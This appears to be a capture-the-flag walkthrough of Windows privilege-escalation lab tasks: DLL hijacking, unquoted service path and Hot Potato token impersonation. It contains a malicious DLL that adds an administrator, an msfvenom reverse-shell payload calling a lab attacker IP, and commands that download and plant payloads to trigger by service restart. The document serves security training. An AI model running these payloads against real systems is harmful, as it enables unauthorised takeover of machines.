## Task 5 DLL Hijacking

![](<../../.gitbook/assets/image (7) (1).png>)

#### Replicate the example explained above on the target machine.&#x20;

```bash
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;

```

#### Modify the payload to change the password of the user jack

```bash
wget http://10.6.9.176/hijackme.dll -OutFile hijackme.dll

## Task 6 Unquoted Service Path

we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1. Being able to write to a folder on the path
2. Being able to restart the service

#### What is the full unquoted path of unquotedsvc

```bash
wmic service get name,displayname,pathname,startmode
sc qc unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-24-15.png>)

{% hint style="success" %}
`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
{% endhint %}

#### Go through subfolders in the unquotedsvc binary path. Which folder does the user have read and write privileges on?

```bash
Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-29-44.png>)

{% hint style="success" %}
`C:\Program Files\Unquoted Path Service`
{% endhint %}

#### What would be the name of the executable you would place in that folder?

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.9.176 -f exe \
         -o /var/www/html/unquotedpathservice.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-32-25.png>)

```bash
cd C:\Program Files\Unquoted Path Service
wget http://10.6.9.176/unquotedpathservice.exe -OutFile common.exe
sc.exe stop unquotedsvc; sc.exe start unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-46-00.png>)

{% hint style="success" %}
`common.exe`
{% endhint %}

#### Obtain Administrator privileges on the target machine. What is the content of the flagUSP.txt file?

```bash
dir /S flagUSP.txt
type C:\Users\Cora\Documents\flagUSP.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-15 05-55-56.png>)

## Task 7 Token Impersonation

Higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation".

### Hot Potato

* Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.&#x20;
* Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.&#x20;
* Step 3: The target system will ask for a proxy configuration file (wpad.dat).&#x20;
* Step 4: A malicious wpad.dat file is sent to the target.

![](<../../.gitbook/assets/image (8) (1).png>)

* Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).&#x20;
* Step 6: The exploit will ask the target system to perform an NTLM authentication.&#x20;
* Step 7: The target system sends an NTLM handshake.&#x20;
* Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be "NT AUTHORITY\SYSTEM".
